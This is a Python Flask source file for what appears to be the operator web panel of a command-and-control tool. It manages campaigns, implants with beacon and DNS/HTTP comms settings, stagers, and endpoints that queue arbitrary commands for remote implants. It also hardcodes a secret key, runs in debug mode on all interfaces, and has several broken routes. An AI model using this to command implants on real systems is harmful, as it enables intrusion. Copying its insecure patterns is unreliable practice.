from flask import Flask, render_template, flash, request, jsonify, g, current_app,url_for, redirect, make_response, session
from flask_sqlalchemy import SQLAlchemy
import base64
from Implant import ImplantSingleton
from flask_login import LoginManager, login_required, current_user, login_user, logout_user
from Database import Database
from UserManagement import UserManagementController
import time
#from wtforms import Form, TextField, TextAreaField, validators, StringField, SubmitField
# This is the web app to control implants and campaigns

db = Database()
Imp=ImplantSingleton.instance
UsrMgmt = UserManagementController()

app = Flask(__name__)
app.config.from_object(__name__)
app.config['SECRET_KEY'] = '7d441f27d441f27567d441f2b6176a'
login = LoginManager(app)
login.init_app(app)
# -- Context Processors --#
@app.context_processor
def inject_dict_for_all_auth_templates():
    # -- Returns the list of Campaigns the auth'd user has read access to --#
    #print(dir(current_user),current_user.is_authenticated)
    if current_user.is_authenticated:
        #print(current_user)
        # Return the list of the users available campaigns for the navbar dropdown.
        print(current_user.user_email)
        return dict(campaignlist=db.Get_AllUserCampaigns(current_user.user_email))
    else:
        return dict()
    # return dict(mydict=code_to_generate_dict())

@app.context_processor
def inject_dict_for_all_campaign_templates(cid=None):
    #print(request.url)
    if 'cid' in g:
        #print("We gots' a CID BOIS!")
        cid =g.get('cid')
        cname=db.Get_CampaignNameFromCID(cid)
    if cid != None:
        return dict(campaign=cname, cid=cid)
    else:
        print("context processor")
        return dict()


# -- Managing the error and user object. --#
@login.user_loader
def load_user(id):
    return db.Get_UserObject(id)
@app.before_request
def before_request():
    return
@app.after_request
def add_header(r):
    return r
@app.errorhandler(404)
def page_not_found(e):
    return redirect(url_for('BaseHomePage'),404) # This should be a proper 404?
@app.errorhandler(401)
def page_not_found(e):
    return redirect(url_for(('login')), 401)

# -- AUTHENTICATION --#
@app.route("/login", methods=['GET','POST'])
def login():
    if request.method=="POST":
        if 'email' in request.form and 'password' in request.form and request.form['email'] != None and request.form['password'] != None:
            a = db.Get_UserObjectLogin(request.form['email'],request.form['password'])
            if a == False:
                return render_template("LoginPage.html", error="Incorrect Username/Password")
            if a.first_logon == 1:
                login_user(a)
                return redirect(url_for("BaseHomePage"))
            else:
                GUID = db.Get_UserFirstLogonGuid(request.form['email'])

                return render_template("PasswordResetPage.html",guid=GUID)
                # return redirect(url_for("PasswordReset",guid=GUID))

    return render_template("LoginPage.html")

@app.route("/logout")
@login_required
def logout():
    if (current_user.is_authenticated):
        logout_user()
        return redirect(url_for("login"))
    else:
        return redirect(url_for("login"))

@app.route("/passwordreset", methods = ['GET','POST'])
def PasswordReset():
    if request.method =="POST":
        a = request
        print(request.form)
        pw_1=request.form['password_one']
        pw_2=request.form['password_two']
        pw_c=request.form['current_password']
        guid=request.form['id']
        if pw_1 == pw_2:
            UserObj = db.User_ChangePasswordOnFirstLogon(guid, pw_c,pw_1)
            if UserObj:
                login_user(UserObj)
                return redirect(url_for('BaseHomePage'))
    # print("Resetting")
    return redirect(url_for('login'))

# -- PURGE --#
# -- PURGE --#

@app.route("/abc", methods =['GET','POST'])
@login_required
def management():
    return render_template('main.html')

@app.route("/aab/<cid>", methods =['GET','POST'])
@login_required
def cmdreturn(cid):
    # print(request, cid)
    if db.Verify_UserCanAccessCampaign(current_user.user_email,cid):
        # print(type())
        return jsonify(Imp.Get_CommandResult(cid))
    else:
        return str(0)
#Endpoint query

@app.route("/aaa/<cmd>", methods =['GET','POST'])
@app.route("/aaa", methods =['GET','POST'])
@login_required
def aaa(cmd=0):
    if request.method=="GET":
        Imp.AddCommand(cmd)
        return "a"
    else:
        Imp.AddCommand(request.form['ta'])
        return "OK."
# -- END PURGE --#
# -- END PURGE --#


# -- NEW ENDPOINTS -- #
@app.route("/")
@login_required
def BaseHomePage():
    a = db.Get_AllUserCampaigns(current_user.user_email)
    return render_template("Homepage.html")

@app.route("/CreateCampaign", methods=['GET','POST'])
@login_required
def CreateNewItem():
    if request.method=="POST":
        if 'CreateCampaign' in request.form:
            print("Building Campaign")
            print(request.form)
            #print(dir())
            # WOrk out if Implant or Campaign
            db.Create_Campaign(request.form['title'],current_user.user_email,request.form['description'])
            return redirect(url_for('BaseHomePage'))
    else:
        return render_template('CreateCampaign.html')




# -- Non-Campaign Specific Pages -- #
# --------------------------------- #

@app.route("/settings",methods=['GET','POST'])
@login_required
def GlobalSettingsPage():
    if request.method == "POST":
        # -- Add user returns a dict with action/result/reason keys.
        Result = UsrMgmt.AddUser(request.form,current_user.user_email)
        print("Check form type and call respecitive function")
        return jsonify(Result)
    return  render_template("GlobalSettings.html")


# -- CAMPAIGN SPECIFIC PAGES -- #
# ----------------------------- #

@app.route("/<cid>/")
@login_required
def BaseImplantPage(cid):
    g.setdefault('cid', cid)
    # -- This needs to return the implant_input.html template if any implants exist, if not reuturn ImplantMain
    # --    also need to work out the CID across the pages...
    Implants = db.Get_AllCampaignImplants(cid)
    #print(Implants[0][0],type(Implants),dir(Implants))
    if len(Implants) >0:
        #   print(Implants, dir(Implants))
        print(Implants)
        print(Implants[0],Implants[0]['iid'],Implants[0])
        print(url_for('ImplantInputPage',cid=cid,iid=Implants[0]['iid']))
        return redirect(url_for('ImplantInputPage',cid=cid,iid=Implants[0]['iid']))
    return render_template("ImplantMain.html",cid=cid, Msg="No implants have called back in association with this campaign - create an implant base and use the stager page.")
@app.route("/<cid>/<iid>")
@login_required
def ImplantInputPage(cid,iid):
    g.setdefault('cid', cid)
    print(cid,iid)
    a=db.Get_AllCampaignImplants(cid)
    print(type(a))

    return render_template("implant_input.html", Implants=a)

@login_required
@app.route ("/<cid>/settings", methods=['GET','POST'])
def BaseImplantSettings(cid):
    # -- Gather Data for settings:
    # -- Users + read/write/none
    # -- Implant List
    g.setdefault('cid', cid)
    Users = db.Get_SettingsUsers(cid, current_user.user_email)
    if request.method == "POST":
        print("POST - User settings changing")
        print(
            "User:",current_user.user_email,
            "Request: ",request.form,
            "CID: ",cid
        )
        #UsrMgmt.AddUserToCampaign(current_user.user_email, request.form, cid)
        #-- make changes.
        return redirect(url_for('BaseImplantSettings', cid=cid))
    else:
        return render_template("CampaignSettings.html", users=Users)


@app.route("/<cid>/implant/create", methods=['GET','POST'])
@login_required
def NewImplant(cid):
    #current_app['cid']=cid
    # -- set SID and user DB to convert --#
    g.setdefault('cid',cid)
    #g['cid']=cid
    if request.method=="POST":
        try:
            if "CreateImplant" in request.form:
                print("Inside subscript:",request.form)
                if request.form['title'] =="" or request.form['url'] =="" or request.form['description'] == "":
                    raise ValueError('Mandatory values left blank')
                title = request.form['title']
                url=request.form['url']
                port = request.form['port']
                description= request.form['description']
                beacon=request.form['beacon_delay']
                initial_delay=request.form['initial_delay']
                if type(port) != int:
                    raise ValueError('Port is required as integer')
                # -- Comms check --#
                if "comms_http" in request.form :
                    if request.form['comms_http']=="on":
                        comms_http=1
                    else:
                        raise ValueError('comms_http exists with non-specific value i.e. != "on" ')
                else:
                    comms_http=0
                if "comms_dns" in request.form :
                    if request.form['comms_dns']=="on":
                        comms_dns=1
                    else:
                        raise ValueError('comms_dns exists with non-specific value i.e. != "on" ')
                else:
                    comms_dns=0
                if "comms_binary" in request.form :
                    if request.form['comms_binary']=="on":
                        comms_binary=1
                    else:
                        raise ValueError('comms_binary exists with non-specific value i.e. != "on" ')
                else:
                    comms_binary=0
                if comms_binary == 0 and comms_dns == 0 and comms_http ==0:
                    raise ValueError('No communitcation channel selected. ')
                print("NOW CREATING IMPLANT")
                print(request.method)
                a = db.Add_Implant(cid, title ,url,port,beacon,initial_delay,comms_http,comms_dns,comms_binary,description)
                if a== True:
                    return render_template('CreateImplant.html', cid=cid,success="Implant created.")
        except Exception as e:
            print("NewImplant: ",e)
            # -- Implicting returning page with Error --#
            return render_template('CreateImplant.html', cid=cid, error=e)

    print("Create Form: ",request.form)
    return render_template('CreateImplant.html', cid=cid)

# -- This may no longer be required -- #
@app.route("/<cid>/implant/generate", methods=["GET", "POST"])
@login_required
def ImplantGenerate():
    # -- Get iid from the POST request
    return "405"

@app.route("/<cid>/implant/cmd", methods=["GET","POST"])
@login_required
def ImplantCmdRegister(cid):
    # -- GET FORM --#
    # --    if ALL register on all implants wiht user write authority
    # --    if <iid> check user write authority
    # --     else RETURN 501 && log error.
    print(request.form)
    return "404"

@app.route("/<cid>/implant/stagers", methods=["GET","POST"])
@login_required
def ImplantStager(cid):
    g.setdefault('cid', cid)
    # -- get request: return list of implants --
    # -- Will update to a dropdown when exporting Word docs etc is possible -- #

    ACI = db.Get_AllImplantBaseFromCid(cid)

    return render_template("ImplantStagerPage.html", implantList=ACI)

@app.route("/<cid>/implant/status", methods=['GET','POST'])
@login_required
def GetImplantStatus(cid):
    a = db.Get_AllCampaignImplants("1")
    data = {}
    count = 1
    for x in a:
        b = x['beacon']
        a = time.time() - x['last_check_in']
        c = {"status": None, "title": x['generated_title'],"last_checked_in": x['last_check_in']}
        if a < b:
            c['status'] = "good"
        elif a < b * 2:
            c['status'] = "normal"
        else:
            c['status'] = "poor"
        data[count] = c
        count = count + 1
    return jsonify(data)

@app.route("/<cid>/Graphs", methods=['GET','POST'])
@login_required
def CampaignGraph(cid):
    g.setdefault('cid', cid)
    # -- If we receive a POST request then we will populate the page, this will be called AFTER the page has loaded.
    if request.method=="POST":
        blah = {'a':"1",'b':"v"}
        return jsonify(blah)
    return render_template("CampaignGraph.html")

# -- Implant command execution -- #
@app.route("/cmd/<cid>", methods=["POST"])
@login_required
def ImplantCommandRegistration(cid):
    if request.method == "POST":
        print("CID: ",cid,"\nFRM: ",request.form)
        if "cmd" in request.form and "ImplantSelect" in request.form:
            # This check if specific implant or ALL implants.
            ListOfImplantsToExecute = db.Get_ImplantIDFromTitle(cid,request.form['ImplantSelect'], current_user.user_email)
            for Implants in ListOfImplantsToExecute:
                print("ALL:",Implants)
                # print(request.form['cmd'])
                Imp.AddCommand(current_user.user_email, Implants ,request.form['cmd'])

            # This needs to be
            return jsonify({"1":2})
    return "000"

if __name__ == "__main__":
    app.run(debug=True, host='0.0.0.0', port=5001, threaded=True)
    print ("App running")